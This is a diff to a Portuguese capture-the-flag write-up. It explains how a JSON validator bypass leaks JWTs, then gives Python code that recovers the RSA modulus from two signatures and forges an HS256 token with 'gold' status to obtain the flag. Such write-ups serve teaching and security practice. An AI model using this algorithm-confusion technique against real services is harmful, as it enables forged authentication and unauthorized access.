@@ -21,10 +21,11 @@ const pattern = {
   ],
 };
 ```
-Porém a na linha 42 de checkin.js existe a verificação data["extras"][e]["sssr"] == "FQTU"
+Porém a na linha 42 de checkin.js existe a verificação ```data["extras"][e]["sssr"] == "FQTU"```
 que caso seja verdadeira vaza um token JWT.
 
 Para satisfazer essa verificação e bypassar a validação do jpv pode ser explorada a vulnerabilidade definida em: https://github.com/manvel-khnkoyan/jpv/issues/6
+
 utilzamos o seguinte payload:
 ```
     "firstName": "Algum",
@@ -40,3 +41,35 @@ utilzamos o seguinte payload:
         }
     }
 ```
+
+Com isso conseguimos vazar tokens diferentes apenas alterando o valor do campo "passport" ou "ffp"
+
+Com os dois tokens vazados temos recursos para calcular a chave pública. Para isso usamos uma função auxiliar get_magic():
+
+```
+def get_magic(jwt_token: str, e: int) -> gmpy2.mpz:
+    """
+    Calcula o valor sig**e - pt para um JWT assinado com RS256.
+    """
+    header, payload, signature = jwt_token.split(".")
+    raw_signature = urlsafe_b64decode(f"{signature}==")
+    raw_signature_int = gmpy2.mpz(bytes_to_long(raw_signature))
+
+    padded_msg = pkcs1_v1_5_encode(f"{header}.{payload}".encode(), len(raw_signature))
+    padded_int = gmpy2.mpz(bytes_to_long(padded_msg))
+
+    return gmpy2.mpz(pow(raw_signature_int, e) - padded_int)
+```
+
+Temos assim um possível k.n (assumindo e = 65537), com os dois tokens diferentes conseguimos tirar o gcd e descobrir o N. Tornando possível a geração da mesma chave publica.
+
+Agora com a chave pública podemos montar o nosso token final. Para conseguir utilizar a chave pública sem saber a chave privada, mudamos o algoritmo de criptografia de RS256 -> HS256 no header do JWT.
+
+```{"alg": "HS256", "typ": "JWT"} ```
+
+Testamos também mudar o "alg" para "none" como descrito em https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/ porém sem sucesso.
+
+Já no payload do JWT apenas setamos o status para "gold" para passar a verificação da entrega da flag.
+
+Com isso conseguimos forjar um token JWT que passa por todas as verificações e retorna a flag!
+
